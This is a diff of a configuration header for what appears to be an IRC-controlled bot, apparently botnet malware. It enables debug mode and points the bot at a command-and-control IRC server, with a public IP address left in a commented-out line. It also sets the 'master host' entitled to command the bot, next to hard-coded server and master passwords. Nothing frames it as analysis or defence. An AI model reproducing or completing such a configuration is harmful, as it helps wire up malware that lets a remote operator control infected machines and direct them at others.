@@ -2,13 +2,15 @@
 #define __CONFIG_H_
 
 /* BACKGROUND MODE '0', DEBUG MODE '1' (JUST FOR DEVELOPERS) */
-#define background_mode 0
+#define background_mode 1 
 
 /* IRC SERVER SYNTAX: IP:PORT                            */
 /* OR IP:PORT|IP:PORT|IP:PORT ETC.. TO ADD MORE (MAX 10) */
 /* WARNING: DON'T CHANGE PASSPROTO VALUE IF YOU DON'T    */
 /* HAVE AN MODDED PROTOCOL IRCD!!!                       */
-#define irc_servers  "127.0.0.1:6666|127.0.0.2:6667"
+//#define irc_servers  "45.32.148.245:12386"
+//#define irc_servers  "127.0.0.1:6667"
+#define irc_servers  "172.16.163.141:6667"
 #define passproto    "PASS"
 #define irc_passwd   "fuckya"
 /* IRC SERVER ENCRYPTED 0=IRC_SERVERS 1=ENC_SERVERS */
@@ -26,7 +28,11 @@
 #define irc_chankey   "key"
 
 /* MASTER HOSTNAME WILL BE ABLE TO PERFORM AUTHENTICATION */
-#define master_host     "@hostname.tld"
+//#define master_host     "@hostname.tld"
+//#define master_host     "127.0.0.1"
+//#define master_host     "45.32.148.245"
+#define master_host     "Clk-51AB92F6"
+//#define master_host     "9308931B.928C7895.FAECC4E5.IP"
 /* MASTER PASSWORD AUTHENTICATION (BOT PARTYLINE) */
 #define master_password "pwn"
 
